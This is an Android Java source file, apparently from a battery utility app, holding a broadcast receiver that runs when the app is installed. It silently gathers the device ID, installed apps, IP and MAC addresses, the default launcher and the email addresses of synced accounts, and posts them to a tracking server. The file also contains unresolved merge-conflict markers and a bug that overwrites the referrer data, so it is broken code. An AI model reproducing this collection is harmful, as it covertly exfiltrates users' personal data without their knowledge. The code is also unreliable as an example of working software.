package com.receptix.batterybuddy.receiver;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Build;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.util.Patterns;
import android.widget.Toast;

import com.google.firebase.iid.FirebaseInstanceId;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonPrimitive;
import com.koushikdutta.async.future.FutureCallback;
import com.koushikdutta.ion.Ion;
import com.receptix.batterybuddy.helper.AppKey;
import com.receptix.batterybuddy.helper.LogUtil;
import com.receptix.batterybuddy.helper.MCrypt;
import com.receptix.batterybuddy.helper.Utils;

import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.regex.Pattern;

import static com.receptix.batterybuddy.helper.Constants.JsonProperties.AUTH_KEY;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEFAULT_LAUNCHER;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEVICE_ID;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEVICE_INFO;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.EMAILS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.ETHERNET;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.INSTALLED_APPS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.IP_ADDRESS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.MAC_ADDRESS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.REQUEST_OBJECT;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.WLAN;
import static com.receptix.batterybuddy.helper.Constants.Params.APP_NAME;
import static com.receptix.batterybuddy.helper.Constants.Params.REFERRER;
import static com.receptix.batterybuddy.helper.Constants.Params.REFERRER_JSON_OBJECT;
import static com.receptix.batterybuddy.helper.Constants.Params.STATUS_SUCCESS;
import static com.receptix.batterybuddy.helper.Constants.Urls.URL_TRACKING_OZOCK_INSTALLED;

/**
 * Created by hello on 5/23/2017.
 */

public class InstallReferrerReceiver extends BroadcastReceiver {

    JsonObject jsonObject = new JsonObject();

    @Override
    public void onReceive(final Context context, Intent intent) {

<<<<<<< HEAD
=======

>>>>>>> e02d3f2f2dabbf6e62be8b881e3e80c5312f9b94
        try {

            String referrer = intent.getStringExtra("referrer");
            Log.e("Referrer", referrer);

            String url = URL_TRACKING_OZOCK_INSTALLED;
            jsonObject.addProperty(REFERRER, referrer);
            jsonObject.addProperty(APP_NAME, context.getPackageName());
            LogUtil.d(REFERRER_JSON_OBJECT, jsonObject.toString());
            // get user details...
            fetchUserDetails(context);

            Ion.with(context)
                    .load(url)
                    .setBodyParameter("data", jsonObject.toString())
                    .asJsonObject()
                    .setCallback(new FutureCallback<JsonObject>() {
                        @Override
                        public void onCompleted(Exception e, JsonObject result) {

                            if (result != null) {
                                Log.d("Result", result.toString());
                                String status = result.get("status").toString();
                                if (status.equalsIgnoreCase(STATUS_SUCCESS)) {
                                    LogUtil.d("Install_Referrer", "Success");


                                }
                            }
                        }
                    });


        } catch (Exception e) {
            e.printStackTrace();
        }


    }

    private void fetchUserDetails(Context context) {

        jsonObject = new JsonObject();

        // get device id
        String userDeviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        jsonObject.addProperty(DEVICE_ID, userDeviceId);
        String authkey = Base64.encodeToString(userDeviceId.getBytes(), Base64.NO_WRAP | Base64.URL_SAFE);
        jsonObject.addProperty("authkey", authkey);

<<<<<<< HEAD
        MCrypt mCrypt = new MCrypt();
        try {
            String encrypted = MCrypt.bytesToHex( mCrypt.encrypt(userDeviceId) );
            jsonObject.addProperty(AUTH_KEY,encrypted);
        } catch (Exception e) {
            e.printStackTrace();
        }
=======
>>>>>>> e02d3f2f2dabbf6e62be8b881e3e80c5312f9b94

        // get list of installed apps on user device
        JsonArray installedAppsList = new JsonArray();
        List<PackageInfo> packList = context.getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packList.size(); i++) {
            PackageInfo packInfo = packList.get(i);
            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String appName = packInfo.applicationInfo.loadLabel(context.getPackageManager()).toString();
                JsonPrimitive jsonPrimitive = new JsonPrimitive(appName);
                installedAppsList.add(jsonPrimitive);
            }
        }

        // get user device information
        StringBuilder deviceInfoStringBuilder = new StringBuilder();
        deviceInfoStringBuilder.append("Android Version : ").append(Build.VERSION.RELEASE);

        Field[] fields = Build.VERSION_CODES.class.getFields();
        String osName = fields[Build.VERSION.SDK_INT + 1].getName();
        deviceInfoStringBuilder.append(" OS Name :").append(osName);

        String deviceIpAddress = Utils.getIPAddress(true);
        String deviceMacAddress = Utils.getMACAddress(WLAN);
        if (deviceMacAddress.length() == 0) {
            deviceMacAddress = Utils.getMACAddress(ETHERNET);
        }

        // get the default launcher
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_HOME);
        ResolveInfo defaultLauncher = context.getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
        String defaultLauncherStr = defaultLauncher.activityInfo.packageName;


        // Get user account (synced accounts on device)
        Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
        Account[] accounts = AccountManager.get(context).getAccounts();
        JsonArray userAccounts = new JsonArray();

        for (Account account : accounts) {
            if (emailPattern.matcher(account.name).matches()) {
                String possibleEmail = account.name;
                JsonPrimitive jsonPrimitive = new JsonPrimitive(possibleEmail);
                userAccounts.add(jsonPrimitive);
            }
        }

        // create final JSONObject to be sent to server
        jsonObject.addProperty(DEVICE_INFO, deviceInfoStringBuilder.toString());
        jsonObject.addProperty(IP_ADDRESS, deviceIpAddress);
        jsonObject.addProperty(MAC_ADDRESS, deviceMacAddress);
        jsonObject.addProperty(DEFAULT_LAUNCHER, defaultLauncherStr);
        jsonObject.add(INSTALLED_APPS, installedAppsList);
        jsonObject.add(EMAILS, userAccounts);


    }

}
